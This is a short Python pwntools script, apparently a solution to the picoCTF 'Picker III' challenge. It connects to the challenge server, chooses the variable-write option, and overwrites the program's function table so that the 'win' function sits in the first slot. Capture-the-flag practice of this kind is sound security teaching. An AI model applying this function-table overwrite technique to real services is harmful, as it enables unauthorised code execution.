from pwn import *

local = False
func_table = \
'''\
"win                             \
read_variable                   \
write_variable                  \
getRandomNumber                 \
"'''

func_table_bytes = func_table.encode()
print(func_table_bytes)
if local:
    io = process(['python3', 'picker-III.py'])
else: 
    io = remote('saturn.picoctf.net', 53049)

response = io.recv()
io.sendline(b'3')
resp = io.recv()
io.sendline(b'func_table')
print(resp)

io.sendline(func_table_bytes)
io.interactive()
